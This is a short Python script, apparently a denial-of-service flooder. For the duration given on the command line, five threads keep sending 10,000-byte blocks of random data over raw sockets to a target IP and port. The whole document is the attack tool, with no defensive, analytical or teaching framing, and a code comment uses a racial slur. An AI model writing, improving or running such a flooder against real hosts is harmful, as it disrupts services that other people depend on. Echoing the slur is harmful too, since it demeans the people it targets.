import socket
import concurrent.futures
import os
import random
import sys
import time

def floods(target_host, target_port, duration):
    start_time = time.time()
    
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            payload = os.urandom(10000)
            s.sendto(payload, (target_host, target_port))
        except Exception as e:
            print("Error:", e)
        finally:
            s.close()


if len(sys.argv) != 4:
    print("Usage: python3 script.py <ip> <port> <duration>")
    sys.exit(1)

target_host = sys.argv[1]  
target_port = int(sys.argv[2])  
duration = int(sys.argv[3]) 

num_threads = 5 # Change if you want nigga

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    for _ in range(num_threads):
        executor.submit(floods, target_host, target_port, duration)

print("finished.")